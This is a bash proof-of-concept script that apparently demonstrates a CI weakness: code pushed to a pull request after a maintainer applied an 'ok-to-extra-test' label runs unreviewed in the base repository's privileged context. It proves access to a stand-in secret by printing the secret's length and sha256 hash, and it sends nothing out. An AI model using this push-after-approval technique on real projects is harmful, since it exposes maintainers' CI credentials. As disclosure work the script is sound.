#!/usr/bin/env bash
# MALICIOUS version - swap this in as ./poc.sh in commit B (the attacker's
# unreviewed push AFTER ok-to-extra-test was already applied to commit A).
# It only PROVES access to the privileged secret; it does not exfiltrate.
echo "=== PWNED: unreviewed PR-head code executing in base-repo privileged context ==="
echo "running at commit: $(git rev-parse HEAD)"
echo "commit subject:    $(git log -1 --pretty=%s)"

# Prove we can see the base-repo secret (stand-in for MINIKUBE_AZ_* / SSHPASS).
# GitHub masks the raw value in logs; the length + sha256 prove we HELD it,
# without leaking it. A real attacker would exfiltrate here.
echo "CANARY_SECRET length: ${#CANARY_SECRET}"
printf 'CANARY_SECRET sha256: '
printf '%s' "$CANARY_SECRET" | sha256sum

echo "=== If you see this block in a run checked out at commit B, the re-trigger works ==="
